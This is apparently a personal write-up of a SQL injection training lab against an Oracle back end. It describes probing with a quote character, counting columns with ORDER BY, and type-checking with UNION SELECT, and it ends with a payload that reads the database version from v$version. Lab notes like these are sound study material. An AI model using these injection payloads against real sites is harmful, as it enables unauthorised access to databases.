# Analysis

-  Test for sql vulnerabilities by adding a `'` to the end of the url query which gives me an internal server error which verifies it's vulnerable.
- I then find the columns number by using `order by 1--` going up numbers until i find the correct amount of columns. It will throw a server error again when you reached the top.

![[Pasted image 20240718153748.png]]

**Status Codes**
- 200 OK
- 500 Internal Server Error

Here i have two columns.

I need to now determine the data of the columns, and to do that i can use the **UNION SELECT** 

`' UNION SELECT 'a', NULL--`

If the data types _DO NOT_ match then it should throw an error.  If it does match then the data type would be `Type String`
If the data is a paragraph of a article then it is probably a string, or if it's graph data it could be an integer etc.

In this case they are probably both strings.

**Don't forget to URL encode**

Because this is `ORACLE` it has a special statement that i need to use.

```php
SELECT FROM
```

Here i need to use `DUAL` because i don't know the table names.

```php
SELECT FROM DUAL
```

Now to complete the lab i need to output the version of the database.

```php
SELECT banner FROM v$version
```

### Payload

```php
' UNION SELECT banner, NULL FROM v$version--
```


![[Pasted image 20240718160443.png]]

Exploit: `if 200 in r.text`
